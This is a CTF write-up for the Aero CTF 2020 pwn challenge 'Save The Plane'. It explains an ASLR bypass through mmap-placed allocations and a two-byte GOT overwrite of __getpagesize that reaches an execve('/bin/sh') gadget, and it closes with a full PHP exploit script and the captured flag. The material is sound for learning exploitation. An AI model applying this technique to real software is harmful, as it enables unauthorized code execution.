# Save The Plane - Aero CTF 2020 (warmup, 493p, 8 solved)
## Introduction

Save The Plane is a pwn task.

An archive containing a binary, a libc and its corresponding loader (`ld.so`).

The binary simulates a scenario in which the user is in a plane where a bomb is
about to detonate, and they have to defuse it in 3 seconds or the program will
exit.

Although it is in the `Warmup` category, this was the hardest pwn task.

## Reverse engineering

The program is straightforward: there is only one valid path, and barely no
choice to make.

It first asks for an integer `n` inferior to `0x20000`. It will allocate `n`
bytes of memory by calling `malloc(n)`.

It will then spawn a new thread that waits 6 seconds and leaves. (The bomb)

In the meantime, it will ask the user for an offset and will read `n` bytes to
`ptr + offset`. There are no bound checks on purpose.

The program waits for the bomb thread to end before exiting.

## Exploitation

The first problem that arises while trying to exploit this vulnerability is
that, the binary being executed on a system with ASLR enabled, it is not
possible to locate the main ELF or libc mappings as the gap between the heap and
these mappings are randomized at each start of the binary.

This problem can be circumvented by allocating a huge number. When an
allocation is made with the size passing a certain threshold, `malloc` uses the
`mmap` syscall to allocate memory instead of using the program break (the heap).

This syscall is also used by the loader (`ld.so`) when loading libraries. The
offset between different maps are deterministic despite ASLR. This makes it
possible to overwrite the different libraries' writable pages.

The second problem is that, once again because of ASLR, it is not possible to
put a function pointer from the libc as the full address the libc's base is not
known. No interesting gadget was identified in the non-PIE binary.

On top of that, both thread seemingly calls no function from a pointer stored in
a writable memory area.

It turns out they do: the second thread is called by `start_thread` from
`libpthread.so`.

It then calls a bunch of functions to clear the resources allocated to the
thread. This library imports a few functions from the libc, and uses its GOT to
keep track of the relocation (just like any program). This means that there are
pointers to libc functions stored in a writable mapping.

This does not solve the base address problem, but this helps a lot : instead of
writing the full address, it is possible to write only the first few bytes.
Pages are aligned to a multiple of 4096 bytes, so the 12 least significant bits
are always the same.

Overwriting two bytes (16 bits) results in a 4-bits bruteforce. (1 chance out of
16)

Overwriting three bytes (24 bits) results in a 12-bits bruteforce. (1 chance out
of 4096)

After digging through libpthread's GOT, `__getpagesize` appears to be a good
candidate because:
1. it is called after the thread runs, so overwriting it will make the program
   jump to the modified pointer
2. it is called before the thread runs, so its symbol is already resolved
3. its offset (`libc+0xf1e20` is very close to the one-shot gadget at
   `libc+0xe664b`)

```
(gdb) x/ga 0x7ffff7fae000 + 0x0001c1d0
0x7ffff7fca1d0:	0x00007ffff7edfe20 // __getpagesize (in libc)

(gdb) x/5i 0x00007ffff7edfe20 - 0xf1e20 + 0xe664b
   0x7ffff7ed464b:	mov    rax,QWORD PTR [rip+0xd285e]        # 0x7ffff7fa6eb0
   0x7ffff7ed4652:	lea    rsi,[rsp+0x60]
   0x7ffff7ed4657:	lea    rdi,[rip+0x9d690]        # 0x7ffff7f71cee
   0x7ffff7ed465e:	mov    rdx,QWORD PTR [rax]
   0x7ffff7ed4661:	call   0x7ffff7eb5e80 // execve("/bin/sh", NULL, environ)

(gdb) x/s 0x7ffff7f71cee
0x7ffff7f71cee:	"/bin/sh"
```

As a result, overwriting the 2 first bytes of the `__getpagesize` pointer will
result in a 1/16 chances to have the call replaced with a call the a one-shot
gadget.

**Flag**: `Aero{641b1b4a31366a80c76ef8328940e091c03b67a69877c76282345b0de310cf8d}`

## Appendices

### pwn.php
```php
#!/usr/bin/php
<?php
require_once("Socket.php");

$t = new Socket("tasks.aeroctf.com", 33027);

$t->expectLine("---- Save plane ----");

$t->expectLine("{?} How many resources do you need to save the plane?");
$t->expect("{?} Resources: ");
$t->write((0x30000 - 0x18) . "\n");
$offset = 0x33000 - 0x10;

$t->expectLine("{+} You can use this resources as you will!");

$t->expect("{?} Enter data offset: ");
$t->write((0x7ffff7fca1d0 - 0x00007ffff7dbb010) . "\n"); // getpagesize got

$t->expect("offset = ");
$t->readLine();

$t->expect("{?} Input data: ");
$t->write("\x4B\x46"); // one-gadget: should work 1/8


$t->expectLine("...************ BOOOOOOOOOOOM!!!!!!!!!!! ************");
$t->write('/bin/cat /tmp/flag.txt ; echo $(</tmp/flag.txt)' . "\n");

try {
	while($packet = $t->readLine())
		printf("%s\n", $packet);
} catch(Exception $e) {
}
```
